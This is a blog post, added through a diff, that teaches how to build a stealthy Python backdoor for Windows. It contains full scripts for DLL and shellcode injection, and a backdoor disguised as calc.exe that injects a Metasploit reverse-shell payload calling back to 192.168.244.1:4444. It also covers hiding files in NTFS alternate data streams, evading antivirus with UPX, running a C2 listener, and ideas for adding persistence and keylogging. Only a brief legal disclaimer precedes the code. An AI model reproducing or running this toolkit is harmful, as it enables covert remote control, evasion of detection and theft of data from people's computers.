@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>DLL & Code Injection: Build a Stealthy Python Backdoor from Scratch — Aimad Ul Islam</title>
+  <meta name="description" content="Master remote thread creation, DLL injection, and code injection to build a professional-grade Python backdoor with process execution redirection."/>
+  <meta name="keywords" content="python, dll-injection, code-injection, backdoor, cybersecurity, windows, metasploit, pentesting, reverse shell"/>
+  <meta name="author" content="Aimad Ul Islam"/>
+  <meta name="robots" content="index, follow"/>
+  <link rel="canonical" href="https://aimadulislam.dpdns.org/posts/python-backdoor-injection.html"/>
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article"/>
+  <meta property="og:title" content="DLL & Code Injection: Build a Stealthy Python Backdoor from Scratch"/>
+  <meta property="og:description" content="Master remote thread creation, DLL injection, and code injection to build a professional-grade Python backdoor."/>
+  <meta property="og:url" content="https://aimadulislam.dpdns.org/posts/python-backdoor-injection.html"/>
+  <meta property="article:author" content="Aimad Ul Islam"/>
+  <meta property="article:published_time" content="2026-08-05"/>
+  <meta property="article:section" content="Cybersecurity"/>
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" content="DLL & Code Injection: Build a Stealthy Python Backdoor from Scratch"/>
+  <meta name="twitter:description" content="Master remote thread creation, DLL injection, and code injection to build a professional-grade Python backdoor."/>
+
+  <!-- Schema.org -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "DLL & Code Injection: Build a Stealthy Python Backdoor from Scratch",
+    "description": "Master remote thread creation, DLL injection, and code injection to build a professional-grade Python backdoor.",
+    "author": {"@type": "Person", "name": "Aimad Ul Islam", "url": "https://aimadulislam.dpdns.org"},
+    "datePublished": "2026-08-05",
+    "dateModified": "2026-08-05",
+    "url": "https://aimadulislam.dpdns.org/posts/python-backdoor-injection.html",
+    "publisher": {"@type": "Person", "name": "Aimad Ul Islam"}
+  }
+  </script>
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Ccircle cx='32' cy='32' r='30' fill='%23050810'/%3E%3Ccircle cx='32' cy='32' r='30' fill='none' stroke='%2300D4FF' stroke-width='2.5'/%3E%3Ctext x='32' y='39' text-anchor='middle' font-family='Arial Black,Arial' font-weight='900' font-size='26' fill='%2300D4FF'%3EA%3C/text%3E%3C/svg%3E"/>
+
+  <!-- Fonts & CSS -->
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <link rel="stylesheet" href="../css/blog.css"/>
+</head>
+<body>
+
+<!-- Reading Progress Bar -->
+<div id="reading-progress" role="progressbar" aria-label="Reading progress"></div>
+
+<!-- Background Elements -->
+<div class="grid-bg" aria-hidden="true"></div>
+<div class="scan-line" aria-hidden="true"></div>
+
+<!-- Navigation -->
+<nav class="blog-nav" id="navbar" role="navigation" aria-label="Main navigation">
+  <a href="../index.html" class="nav-logo">
+    <span class="br">[</span>Aimad<span class="nav-dot" aria-hidden="true"></span>Security<span class="br">]</span>
+  </a>
+  <ul class="nav-links" role="list">
+    <li><a href="../index.html#about">About</a></li>
+    <li><a href="../index.html#certifications">Certs</a></li>
+    <li><a href="../index.html#skills">Skills</a></li>
+    <li><a href="../blog.html" class="active">Blog</a></li>
+    <li><a href="../index.html#contact">Contact</a></li>
+  </ul>
+  <div class="nav-right">
+    <div class="nav-status"><div class="status-dot" aria-hidden="true"></div><span class="status-text">Available for Internship</span></div>
+    <button id="dark-mode-btn" class="dark-mode-btn" aria-label="Toggle dark mode"><i class="fa-solid fa-moon" aria-hidden="true"></i></button>
+    <a href="../blog.html" class="nav-btn"><i class="fa-solid fa-arrow-left fa-xs" aria-hidden="true"></i> Blog</a>
+  </div>
+  <button class="hamburger" id="ham" aria-label="Toggle menu"><span></span><span></span><span></span></button>
+</nav>
+
+<div class="mobile-nav" id="mobNav">
+  <a href="../index.html">Home</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../index.html#contact">Contact</a>
+</div>
+
+<!-- Article Hero -->
+<div class="article-hero" style="padding-top:86px;">
+  <div class="container-narrow">
+
+    <!-- Breadcrumb -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+      <a href="../index.html"><i class="fa-solid fa-house fa-xs" aria-hidden="true"></i> Home</a>
+      <i class="fa-solid fa-chevron-right" aria-hidden="true"></i>
+      <a href="../blog.html">Blog</a>
+      <i class="fa-solid fa-chevron-right" aria-hidden="true"></i>
+      <span aria-current="page">Python Backdoor Injection</span>
+    </nav>
+
+    <!-- Hero Image placeholder -->
+    <div class="article-hero-img-wrap" style="max-height:380px;background:linear-gradient(135deg,rgba(255,0,0,0.05),rgba(0,212,255,0.08));display:flex;align-items:center;justify-content:center;font-size:6rem;min-height:200px;">
+      🐉
+    </div>
+
+    <!-- Article Header -->
+    <header class="article-header">
+      <div class="article-cats">
+        <span class="tag tag-prog">Programming</span>
+        <span class="tag tag-cyber">Cybersecurity</span>
+        <span class="tag tag-tut">Tutorials</span>
+      </div>
+      <h1 class="article-title">DLL & Code Injection: Build a Stealthy Python Backdoor from Scratch</h1>
+      <p class="article-subtitle">Master remote thread creation, DLL injection, and code injection to build a professional-grade Python backdoor with process execution redirection.</p>
+      <div class="article-meta" role="contentinfo" aria-label="Article information">
+        <div class="article-meta-item"><i class="fa-solid fa-user" aria-hidden="true"></i><span><strong>Aimad Ul Islam</strong></span></div>
+        <div class="article-meta-item"><i class="fa-regular fa-calendar" aria-hidden="true"></i><span>August 5, 2026</span></div>
+        <div class="article-meta-item"><i class="fa-solid fa-rotate" aria-hidden="true"></i><span>Updated: August 5, 2026</span></div>
+        <div class="article-meta-item"><i class="fa-regular fa-clock" aria-hidden="true"></i><span id="reading-time-val">24 min read</span></div>
+      </div>
+      <div class="article-tags" aria-label="Tags">
+        <span class="tag tag-prog">python</span>
+        <span class="tag tag-tut">dll-injection</span>
+        <span class="tag tag-tut">code-injection</span>
+        <span class="tag tag-cyber">backdoor</span>
+        <span class="tag tag-cyber">penetration-testing</span>
+      </div>
+    </header>
+  </div>
+</div>
+
+<!-- Main Content -->
+<main>
+  <section style="padding-top:2rem;">
+    <div class="container">
+      <div class="article-layout">
+
+        <!-- Article Body -->
+        <article>
+
+          <!-- Table of Contents -->
+          <nav id="toc" aria-label="Table of contents">
+            <div class="toc-title" role="button" aria-expanded="true" tabindex="0">
+              <i class="fa-solid fa-list" aria-hidden="true"></i> Table of Contents
+              <i class="fa-solid fa-chevron-down" style="margin-left:auto;font-size:0.7rem;" aria-hidden="true"></i>
+            </div>
+            <ol class="toc-list" role="list">
+              <li class="toc-item"><a href="#intro">Introduction</a></li>
+              <li class="toc-item"><a href="#foundation">The Foundation: Remote Thread Creation</a></li>
+              <li class="toc-item"><a href="#dll-injection">DLL Injection: Injecting Libraries into Processes</a></li>
+              <li class="toc-item"><a href="#code-injection">Code Injection: Executing Raw Shellcode</a></li>
+              <li class="toc-item"><a href="#backdoor">Building the Backdoor: Execution Redirection</a></li>
+              <li class="toc-item"><a href="#file-hiding">Stealth Tactics: Hiding Files with ADS</a></li>
+              <li class="toc-item"><a href="#compiling">Compiling with py2exe for Portability</a></li>
+              <li class="toc-item"><a href="#c2-server">C2 Server: Building the Control Interface</a></li>
+              <li class="toc-item"><a href="#next-steps">Next Steps & Enhancements</a></li>
+            </ol>
+          </nav>
+
+          <!-- Article Body Text -->
+          <div class="article-body">
+
+            <h2 id="intro">Introduction</h2>
+            <p>At times when reversing or attacking a target, it is useful to load code into a remote process and have it execute within that process's context. Whether you're stealing password hashes or gaining remote desktop control of a target system, DLL and code injection are powerful techniques that allow you to penetrate the deepest layers of an operating system.</p>
+            <p>This guide is based on the foundational concepts from Justin Seitz's <em>Gray Hat Python</em> (Chapter 7). We will build a complete, portable backdoor entirely in Python. We'll cover remote thread creation, injecting DLLs to load malicious libraries, injecting raw shellcode to kill rogue processes, and disguising our files using NTFS Alternate Data Streams (ADS). By the end, you'll have a working, reusable codebase that demonstrates exactly how modern malware and red-team tools operate at the system level.</p>
+
+            <div class="callout callout-warn">
+              <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
+              <div>
+                <div class="callout-title">Ethical & Legal Reminder</div>
+                <div class="callout-body">The techniques shown here must only be used on systems you own or have explicit written permission to test. Unauthorized injection into remote processes is a felony in many jurisdictions.</div>
+              </div>
+            </div>
+
+            <h2 id="foundation">The Foundation: Remote Thread Creation</h2>
+            <p>Both DLL injection and code injection rely on a single, powerful Windows API call: <strong>CreateRemoteThread()</strong>. This function, exported from <code>kernel32.dll</code>, creates a thread that runs in the virtual address space of another process.</p>
+            <p>Here is the prototype:</p>
+
+            <div class="code-block-wrap">
+              <span class="code-block-label">CreateRemoteThread API</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>HANDLE WINAPI CreateRemoteThread(
+  HANDLE hProcess,
+  LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  SIZE_T dwStackSize,
+  LPTHREAD_START_ROUTINE lpStartAddress,
+  LPVOID lpParameter,
+  DWORD dwCreationFlags,
+  LPDWORD lpThreadId
+);</code></pre>
+            </div>
+            <p>The key parameters are:</p>
+            <ul>
+              <li><strong>hProcess</strong>: A handle to the process we are injecting into.</li>
+              <li><strong>lpStartAddress</strong>: The memory address where the thread will begin executing. For DLL injection, this will be the address of <code>LoadLibraryA</code>. For code injection, this will be the address of our raw shellcode.</li>
+              <li><strong>lpParameter</strong>: A pointer to the data passed to the start function. For DLL injection, this is the path to the DLL file.</li>
+            </ul>
+            <p>We'll use this core function twice to build our backdoor.</p>
+
+            <h2 id="dll-injection">DLL Injection: Injecting Libraries into Processes</h2>
+            <p>DLL injection is the process of forcing a remote process to load a dynamic link library (DLL) into its memory space. Once loaded, the DLL's code executes with the same privileges as the target process.</p>
+            <p>The procedure is straightforward:</p>
+            <ol>
+              <li>Allocate memory inside the remote process for the DLL path.</li>
+              <li>Write the DLL path into that allocated memory.</li>
+              <li>Get the address of <code>LoadLibraryA</code> (which loads a DLL).</li>
+              <li>Call <code>CreateRemoteThread</code> with <code>lpStartAddress</code> pointing to <code>LoadLibraryA</code> and <code>lpParameter</code> pointing to our DLL path.</li>
+            </ol>
+            <p>Let's write a Python script to do this. Note that we'll need the <code>ctypes</code> library to interact with the Windows API.</p>
+
+            <div class="code-block-wrap">
+              <span class="code-block-label">dll_injector.py</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>import sys
+from ctypes import *
+
+# Windows API Constants
+PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF
+VIRTUAL_MEM = 0x1000 | 0x2000
+PAGE_READWRITE = 0x04
+
+kernel32 = windll.kernel32
+
+if len(sys.argv) != 3:
+    print("[*] Usage: dll_injector.exe &lt;PID&gt; &lt;Path to DLL&gt;")
+    sys.exit(0)
+
+pid = int(sys.argv[1])
+dll_path = sys.argv[2]
+dll_len = len(dll_path)
+
+# 1. Get a handle to the process
+h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+if not h_process:
+    print("[*] Couldn't acquire a handle to PID: %s" % pid)
+    sys.exit(0)
+
+# 2. Allocate memory in the remote process for the DLL path
+arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
+
+# 3. Write the DLL path into the allocated memory
+written = c_int(0)
+kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))
+
+# 4. Resolve the address of LoadLibraryA
+h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
+h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
+
+# 5. Create the remote thread
+thread_id = c_ulong(0)
+if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
+    print("[*] Failed to inject the DLL.")
+    sys.exit(0)
+
+print("[*] Remote thread with ID 0x%08x created." % thread_id.value)</code></pre>
+            </div>
+            <p>To test this, you can compile any DLL (e.g., a simple message box) and run <code>python dll_injector.py &lt;PID&gt; C:\path\to\evil.dll</code>. The target process will load your DLL and execute its <code>DllMain</code> routine.</p>
+
+            <h2 id="code-injection">Code Injection: Executing Raw Shellcode</h2>
+            <p>Code injection moves a step further. Instead of loading a DLL from disk, we write raw, position-independent shellcode directly into the remote process's memory and execute it. This is stealthier because no file touches the disk.</p>
+            <p>For this example, we'll use Metasploit's <code>cmd/windows/exec</code> payload to execute <code>taskkill /PID AAAAA</code>, which terminates a process. We will dynamically swap the <code>AAAAA</code> placeholder with a real PID.</p>
+
+            <div class="code-block-wrap">
+              <span class="code-block-label">code_injector.py</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>import sys
+from ctypes import *
+
+PAGE_EXECUTE_READWRITE = 0x00000040
+PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF
+VIRTUAL_MEM = 0x1000 | 0x2000
+
+kernel32 = windll.kernel32
+
+if len(sys.argv) != 3:
+    print("[*] Usage: code_injector.exe &lt;PID to inject&gt; &lt;PID to kill&gt;")
+    sys.exit(0)
+
+pid = int(sys.argv[1])
+pid_to_kill = sys.argv[2]
+
+# Metasploit Shellcode (cmd/windows/exec) - EXITFUNC=thread, CMD=taskkill /PID AAAA
+shellcode = (
+    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b"
+    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99"
+    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04"
+    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb"
+    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30"
+    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09"
+    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8"
+    "\x83\xc0\x7b\x50\x68\xef\xce\x00\x60\x68\x98\xfe\x8a\x0e\x57\xff"
+    "\xe7\x74\x61\x73\x6b\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41"
+    "\x41\x41\x41\x41\x41\x41\x41\x00"
+)
+
+# Replace the PID placeholder
+padding = 4 - (len(pid_to_kill))
+replace_value = pid_to_kill + ("\x00" * padding)
+replace_string = "\x41" * 8
+shellcode = shellcode.replace(replace_string, replace_value)
+code_size = len(shellcode)
+
+# 1. Get a handle to the process
+h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+if not h_process:
+    print("[*] Couldn't acquire a handle to PID: %s" % pid)
+    sys.exit(0)
+
+# 2. Allocate memory for the shellcode
+arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
+
+# 3. Write the shellcode into memory
+written = c_int(0)
+kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))
+
+# 4. Create the remote thread pointing to the shellcode
+thread_id = c_ulong(0)
+if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
+    print("[*] Failed to inject process-killing shellcode.")
+    sys.exit(0)
+
+print("[*] Remote thread created with ID 0x%08x" % thread_id.value)
+print("[*] Process %s should not be running anymore!" % pid_to_kill)</code></pre>
+            </div>
+            <p>Run this script with <code>python code_injector.py &lt;TargetPID&gt; &lt;VictimPID&gt;</code>. The target process will be injected, and a thread will be spawned that executes <code>taskkill /PID &lt;VictimPID&gt;</code>, instantly killing the victim process.</p>
+
+            <h2 id="backdoor">Building the Backdoor: Execution Redirection</h2>
+            <p>Now we combine these techniques into a fully functional backdoor. The core concept is <strong>execution redirection</strong>. We will name our backdoor <code>calc.exe</code> and place it in the target system's <code>System32</code> folder (after moving the legitimate <code>calc.exe</code> elsewhere).</p>
+            <p>When the user runs <code>calc.exe</code>, the backdoor launches.</p>
+            <ol>
+              <li>It spawns the <em>real</em> calculator process in the background to avoid suspicion.</li>
+              <li>It injects a reverse shell payload into the newly spawned calculator process.</li>
+              <li>It injects a process-killing payload into its own process to clean up.</li>
+            </ol>
+            <p>This requires the <code>ctypes</code> structures for process creation. Here is the complete <code>backdoor.py</code> script:</p>
+
+            <div class="code-block-wrap">
+              <span class="code-block-label">backdoor.py</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>import sys
+from ctypes import *
+
+# Windows API Constants
+PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF
+VIRTUAL_MEM = 0x1000 | 0x2000
+PAGE_EXECUTE_READWRITE = 0x40
+PAGE_READWRITE = 0x04
+CREATE_NEW_CONSOLE = 0x00000010
+
+kernel32 = windll.kernel32
+
+# Define the STARTUPINFO and PROCESS_INFORMATION structs
+class STARTUPINFO(Structure):
+    _fields_ = [
+        ("cb", DWORD),
+        ("lpReserved", LPTSTR),
+        ("lpDesktop", LPTSTR),
+        ("lpTitle", LPTSTR),
+        ("dwX", DWORD),
+        ("dwY", DWORD),
+        ("dwXSize", DWORD),
+        ("dwYSize", DWORD),
+        ("dwXCountChars", DWORD),
+        ("dwYCountChars", DWORD),
+        ("dwFillAttribute", DWORD),
+        ("dwFlags", DWORD),
+        ("wShowWindow", WORD),
+        ("cbReserved2", WORD),
+        ("lpReserved2", LPBYTE),
+        ("hStdInput", HANDLE),
+        ("hStdOutput", HANDLE),
+        ("hStdError", HANDLE),
+    ]
+
+class PROCESS_INFORMATION(Structure):
+    _fields_ = [
+        ("hProcess", HANDLE),
+        ("hThread", HANDLE),
+        ("dwProcessId", DWORD),
+        ("dwThreadId", DWORD),
+    ]
+
+def inject(pid, data, parameter=0):
+    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
+    if not h_process:
+        return False
+
+    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(data), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
+    written = c_int(0)
+    kernel32.WriteProcessMemory(h_process, arg_address, data, len(data), byref(written))
+
+    thread_id = c_ulong(0)
+    if not parameter:
+        start_address = arg_address
+        param = 0
+    else:
+        h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
+        start_address = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
+        param = arg_address
+
+    if not kernel32.CreateRemoteThread(h_process, None, 0, start_address, param, 0, byref(thread_id)):
+        return False
+    return True
+
+# --- Main Backdoor Logic ---
+
+# Path to the legitimate calculator (moved from System32)
+path_to_exe = "C:\\calc.exe"
+
+startupinfo = STARTUPINFO()
+process_information = PROCESS_INFORMATION()
+startupinfo.dwFlags = 0x1
+startupinfo.wShowWindow = 0x0
+startupinfo.cb = sizeof(startupinfo)
+
+# Spawn the legitimate process
+kernel32.CreateProcessA(
+    path_to_exe, None, None, None, None, CREATE_NEW_CONSOLE,
+    None, None, None, byref(startupinfo), byref(process_information)
+)
+
+target_pid = process_information.dwProcessId
+
+# Metasploit Reverse Shell Shellcode (modify LHOST to your IP)
+# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.244.1 LPORT=4444 -e x86/shikata_ga_nai -f python
+connect_back_shellcode = (
+    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+    "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+    "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+    "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
+    "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
+    "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
+    "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+    "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
+    "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
+    "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
+    "\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
+    "\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x58\x50\x68\x02\x00\x11"
+    "\x5c\x89\xe6\x50\x50\x41\x50\x50\x50\x68\xeb\x55\x2e\x3b\xff"
+    "\xd5\x56\xff\xd5\x6a\x0a\x58\x50\x51\x57\x68\x01\x00\x00\x00"
+    "\xbf\x50\x50\x50\x50\x57\x68\x8c\xf4\x43\x79\xff\xd5\x89\xc7"
+    "\x6a\x10\x59\x50\x51\x57\x68\x30\x80\xa4\x6d\xff\xd5\xbf\x49"
+    "\x51\x49\x66\x6a\x00\x51\x56\x57\xff\xd5\xbf\xc0\xa8\xf4\x01" # 192.168.244.1
+    "\x66\x68\x11\x5c\x66\x53\x89\xe6\x6a\x10\x56\x57\x68\xe4\xe7"
+    "\x8c\x49\xff\xd5\x57\x57\x57\x50\x56\x68\x86\x93\x9b\x11\xff"
+    "\xd5\x89\xc7\x68\xab\x48\xa9\x24\xff\xd5\xbb\x00\x00\x00\x00"
+    "\x8b\x1b\x81\xc3\xe0\x00\x00\x00\x39\xc3\x75\xf7\xff\xe7"
+)
+
+# Inject reverse shell into the new calc.exe process
+inject(target_pid, connect_back_shellcode)
+
+# Metasploit Taskkill Shellcode
+process_killer_shellcode = (
+    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b"
+    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99"
+    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04"
+    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb"
+    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30"
+    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09"
+    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8"
+    "\x83\xc0\x7b\x50\x68\xef\xce\x00\x60\x68\x98\xfe\x8a\x0e\x57\xff"
+    "\xe7\x74\x61\x73\x6b\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41"
+    "\x41\x41\x41\x41\x41\x41\x41\x00"
+)
+
+our_pid = str(kernel32.GetCurrentProcessId())
+padding = 4 - (len(our_pid))
+replace_value = our_pid + ("\x00" * padding)
+replace_string = "\x41" * 8
+process_killer_shellcode = process_killer_shellcode.replace(replace_string, replace_value)
+
+# Inject process-killing shellcode into our own backdoor process
+inject(our_pid, process_killer_shellcode)</code></pre>
+            </div>
+            <p>This script requires a <code>reverse shell</code> payload. I used <code>msfvenom</code> to generate a Python-formatted payload targeting <code>192.168.244.1</code> on port <code>4444</code> (ensure you modify this in the <code>connect_back_shellcode</code> variable to match your listener's IP).</p>
+
+            <h2 id="file-hiding">Stealth Tactics: Hiding Files with ADS</h2>
+            <p>In order to safely distribute an injectable DLL with our backdoor, we need a stealthy way of storing the file. <strong>Alternate Data Streams (ADS)</strong> is a feature of the NTFS file system that allows multiple data streams to be attached to a single file.</p>
+            <p>A stream is essentially a hidden file attached to a visible file. By using ADS, we can hide our DLL within the <code>backdoor.exe</code> itself, escaping normal file directory listings and many antivirus scans.</p>
+
+            <div class="code-block-wrap">
+              <span class="code-block-label">file_hider.py</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>import sys
+
+if len(sys.argv) != 3:
+    print("[*] Usage: file_hider.py &lt;DLL_to_hide&gt; &lt;Target_EXE&gt;")
+    sys.exit(0)
+
+# Read in the DLL
+fd = open(sys.argv[1], "rb")
+dll_contents = fd.read()
+fd.close()
+
+print("[*] Filesize: %d" % len(dll_contents))
+
+# Write it out to the alternate data stream
+# Syntax: target_file:stream_name
+fd = open("%s:%s" % (sys.argv[2], sys.argv[1]), "wb")
+fd.write(dll_contents)
+fd.close()</code></pre>
+            </div>
+            <p>To use it: <code>python file_hider.py evil.dll backdoor.exe</code>. The DLL is now hidden inside <code>backdoor.exe</code>. To access it from the backdoor, we'd simply read from <code>backdoor.exe:evil.dll</code>.</p>
+
+            <h2 id="compiling">Compiling with py2exe for Portability</h2>
+            <p>A major challenge for Python backdoors is that the target machine might not have Python installed. <code>py2exe</code> solves this by creating a standalone Windows executable from a Python script, bundling the interpreter and all required modules into a single file.</p>
+            <p>Create a <code>setup.py</code> file to compile your backdoor:</p>
+
+            <div class="code-block-wrap">
+              <span class="code-block-label">setup.py</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>from distutils.core import setup
+import py2exe
+
+setup(
+    console=['backdoor.py'],
+    options={'py2exe': {'bundle_files': 1}},
+    zipfile=None,
+)</code></pre>
+            </div>
+            <p><code>bundle_files: 1</code> and <code>zipfile=None</code> tell <code>py2exe</code> to embed the Python DLL and all dependencies directly into the resulting <code>.exe</code>, making it completely portable.</p>
+            <p>Run the compiler: <code>python setup.py py2exe</code>. The output will be in the <code>dist</code> directory as <code>backdoor.exe</code>.</p>
+
+            <div class="callout callout-info">
+              <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+              <div>
+                <div class="callout-title">Pro Tip</div>
+                <div class="callout-body">For enhanced stealth, you can use <code>UPX</code> (Ultimate Packer for Executables) to compress the resulting <code>.exe</code> file. This reduces the size and changes the file signature, bypassing simple signature-based AV detection.</div>
+              </div>
+            </div>
+
+            <h2 id="c2-server">C2 Server: Building the Control Interface</h2>
+            <p>Finally, we need a listener to receive the reverse shell connections. We'll write a simple Python socket server that accepts connections, reads incoming data, and sends commands.</p>
+
+            <div class="code-block-wrap">
+              <span class="code-block-label">backdoor_shell.py</span>
+              <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+              <pre><code>import socket
+import sys
+
+host = "0.0.0.0"  # Listen on all interfaces
+port = 4444
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((host, port))
+server.listen(5)
+
+print("[*] Server bound to %s:%d" % (host, port))
+
+connected = False
+
+while True:
+    if not connected:
+        (client, address) = server.accept()
+        connected = True
+        print("[*] Accepted Shell Connection from %s" % str(address))
+
+    buffer = ""
+    while True:
+        try:
+            recv_buffer = client.recv(4096)
+            if not len(recv_buffer):
+                break
+            else:
+                buffer += recv_buffer
+                print("[*] Received: %s" % recv_buffer)  # Optional: Stream output
+        except:
+            break
+
+    # Received everything, now send input
+    command = raw_input("Enter Command > ")
+    if command.lower().strip() == "quit":
+        client.close()
+        sys.exit(0)
+    
+    client.sendall(command + "\r\n")
+    print("[*] Sent => %s" % command)</code></pre>
+            </div>
+            <p>Start this script on your attacker machine: <code>python backdoor_shell.py</code>. When you execute <code>backdoor.exe</code> on the victim machine, the reverse shell will connect back to your port <code>4444</code>, granting you system-level access (as long as the target calculator process runs with sufficient privileges).</p>
+
+            <h2 id="next-steps">Next Steps & Enhancements</h2>
+            <p>You now have a fully functional, 100% Python-based backdoor. But this is just the foundation. Here is how you can extend it:</p>
+            <ul>
+              <li><strong>Add persistence:</strong> Modify the script to write itself to the Windows Registry (<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>) so it executes on boot.</li>
+              <li><strong>Improve the shell:</strong> Use the <code>subprocess</code> module to send commands and actually capture the <code>stdout</code>/<code>stderr</code> output back to the server, creating a fully interactive remote shell.</li>
+              <li><strong>Upgrade the payload:</strong> Replace the Metasploit reverse shell with a custom <code>Meterpreter</code> payload to get advanced features like file upload/download and keylogging.</li>
+              <li><strong>Implement encryption:</strong> Encrypt the communication between the backdoor and the C2 server to evade network-based IDS detection.</li>
+            </ul>
+            <p>DLL and code injection are advanced persistence and execution techniques. While we've used them here for a backdoor, they are equally important in red-team exercises, privilege escalation, and malware analysis. Keep experimenting, stay legal, and always push the boundaries of what Python can do!</p>
+
+          </div><!-- end article-body -->
+
+          <!-- Social Share -->
